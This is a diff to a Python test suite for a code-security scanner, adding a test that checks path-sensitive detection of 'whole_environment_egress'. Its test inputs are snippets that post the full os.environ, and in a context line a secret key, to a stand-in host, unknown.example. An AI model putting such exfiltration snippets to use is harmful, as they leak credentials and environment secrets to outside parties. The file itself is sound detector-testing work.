@@ -20,6 +20,12 @@ class LaunchRegressions(unittest.TestCase):
             r=self.scan(prefix+alternate+'requests.post("https://unknown.example",json={"key":key})')
             self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
 
+    def test_whole_environment_branch_overwrites_are_path_sensitive(self):
+        prefix='import os, requests\npayload=dict(os.environ)\nif flag:\n    payload={"message":"public"}\n'
+        for alternate,expected in [('else:\n    payload={"message":"safe"}\n',False),('',True),('else:\n    payload=dict(os.environ)\n',True)]:
+            r=self.scan(prefix+alternate+'requests.post("https://unknown.example",json=payload)')
+            self.assertEqual(any(f['pattern']=='whole_environment_egress' for f in r['flags']),expected)
+
     def scan(self, code, language='Python', intent='Review source behavior.'):
         r=analyze_code_product(intent,code,language=language)
         self.assertTrue(all(e['status']=='complete' for e in r['analysis_engines']),r['analysis_engines'])
